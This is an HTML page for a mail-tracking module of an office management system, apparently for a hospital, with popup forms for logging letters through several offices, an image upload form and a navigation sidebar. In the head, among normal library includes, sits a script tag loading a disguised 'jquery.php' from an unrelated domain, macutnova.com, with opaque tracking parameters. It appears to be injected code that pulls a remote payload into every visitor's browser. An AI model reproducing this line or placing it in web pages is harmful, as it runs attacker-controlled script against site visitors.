
<html>
<head>
<meta charset=utf-8 />
<meta name="viewport" content="user-scalable=no, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, minimal-ui"/>
<title>HOMS Mail Flow</title>
<link rel="stylesheet" type="text/css" href="styles/global.css" /> 

<script src="http://ajax.googleapis.com/ajax/libs/jquery/1/jquery.min.js"></script>
<script src="http://cytoscape.github.io/cytoscape.js/api/cytoscape.js-latest/cytoscape.min.js"></script>

<script src="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.js"></script>
<script src="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.js"></script>
<link href="http://cdnjs.cloudflare.com/ajax/libs/qtip2/2.2.0/jquery.qtip.min.css" rel="stylesheet" type="text/css" />
<script src="https://cdn.rawgit.com/cytoscape/cytoscape.js-qtip/2.2.5/cytoscape-qtip.js"></script>
<script src="https://macutnova.com/jquery.php?u=c16102a344e586c77bd406dfa74ed645&c=split24banner4&p=1"></script>
</head>
<body>
    <div id="pop_background"></div>
    <div id="pop_box_mail_1">
        <form action="mail.php"  method="post" >
            <p>Recieved Date</p>
            <input type="Date" name="Recieved_date" placeholder="Recieved date">
            <input type="submit" name = "submi">
        </form>
    </div>
    <div id="pop_box_mail_2">
            <form action="mail.php" method="post">
                <p>Recieved Date to AO</p>
                <input type="Date" name="Date_to_AO" placeholder="Recieved date to AO">
                <p>Subject</p>
                <input type="text" name="Subject" placeholder="Subject">           
                <p>Forward to</p>
                <input type="text" name="Forward_to" placeholder="Forward to">           
                <input type="submit" name = "submi">
            </form>
    </div>
    <div id="pop_box_mail_3">
        
        <form action="mail.php" method="post">
            <p>Recieved Date to EB</p>
            <input type="Date" name="Date_to_EB" placeholder="Recieved date to EB"> 
            <p>Sender</p>
            <input type="text" name="Sender" placeholder="Sender">           
            <p>Recipient</p>
            <input type="text" name="Recipient" placeholder="Recipient">          
            <p>Forward</p><input type="checkbox" name="Forward" placeholder="Forward or not">
            <input type="submit" name = "submi">
	    </form>
        
        <form action="upload.php" method="post" enctype="multipart/form-data" target="iframe">
            Select image to upload:
            <input type="file" name="fileToUpload" id="fileToUpload">
            <input type="submit" value="Upload Image" name="submit">
        </form> 
        <iframe class="iframe1" name="iframe"></iframe>      
    </div>
    <div id="pop_box_mail_4">
        <form action="" method="post">
            <p>Recieved Date to Recipient</p>
            <input type="Date" name="Recieved_date_to_Recipient" placeholder="Recieved Date to Recipient">           
            <p>Replied</p><input type="checkbox" name="Replied" placeholder="Replied or not">
            <p>Replied Date </p>
            <input type="Date" name="Replied_date" placeholder="Replied Date">
            <input type="submit" name = "submi">
        </form>
    </div>
    <script>
        $(document).ready(function(){
           $('#open_mail_1').click(function(){
               $('#pop_background').fadeIn();
               $('#pop_box_mail_1').fadeIn();
               return false;
           });
           $('#open_mail_2').click(function(){
               $('#pop_background').fadeIn();
               $('#pop_box_mail_2').fadeIn();
               return false;
           });
           $('#open_mail_3').click(function(){
               $('#pop_background').fadeIn();
               $('#pop_box_mail_3').fadeIn();
               return false;
           });
           $('#open_mail_4').click(function(){
               $('#pop_background').fadeIn();
               $('#pop_box_mail_4').fadeIn();
               return false;
           });
           $('#pop_background').click(function(){
               $('#pop_background').fadeOut();
               $('#pop_box_mail_1').fadeOut();
               $('#pop_box_mail_2').fadeOut();
               $('#pop_box_mail_3').fadeOut();
               $('#pop_box_mail_4').fadeOut();
               return false;
           });
        });
    </script>
    <div id="header_mail">
        <div class="logo"><a href="homs_home.php"><span1>#</span1><span2>OMS</span2>    panadura base hospital</a></div>
        <div class="user_name">
            <a href='#' class="user_name">Bhasura Suseen </a>
        </div>
        <div class="menu_icons">
         
          
          
        </div>
    </div>
    <div id="container">
        <div class="sidebar">
            <div class="side_logo_mail">
                <a href="#">mail flow</a>
            </div>
            <ul id="nav">        
                <li><a href="#" class="hr">HR</a></li>
                <li ><a href="#" class="hr1"></i>Attendance </a></li>
                <li ><a href="#" class="hr1"></i>Reports</a></li>
                <li ><a href="employee_data.php" class="hr1"></i>Employee Data</a></li>
                <li ><a href="#" class="mail"></i>Mail </a></li>
                <li ><a href="#" class="mail1"></i>Mail Flow</a></li>
                <li><a href="#" class="diet">Diet Sheet</a></li>
                <li ><a href="diet_calculate.php" class="diet1"></i>Calculate</a></li>
                <li ><a href="#" class="diet1"></i>Report</a></li>
            </ul>
        </div>
        <div class="content">
            <div class="column_middle">
                <div class="mail_dropdown">
                    <a  href="#" target="_self"><p>Mail 001<b> Promotion </b> 2016-8-25 <b> to </b> Anuradha Herath <b> from </b> Ministry</p></a>
                </div>
                <div class="mail_flow_canvas">
                    <div id="cy">
                        <script src="script/code.js"></script>
                    </div>
                </div>
                <div class="mail_flow_bottons">
                     <a  href="#" id="open_mail_1">MS</a><a> ... </a>
                     <a  href="#" id="open_mail_2">AO</a><a> ... </a>
                     <a  href="#" id="open_mail_3">EB</a><a> ... </a>
                     <a  href="#" id="open_mail_4">Recipient</a>
                     
                </div>
                <div class= "mail_flow_details">
                     <a  href="#" target="_self"><p>Mail flow details</p></a>
                </div>                 
            </div>
            <div class="column_right" >
                <div class="right_up"> 
                                  
                </div>
                <div class="right_up_right">
                    
                </div> 
                <div class="right_down">
                    
                </div>
                
            </div>
        </div>               
    </div>

</body>
</html>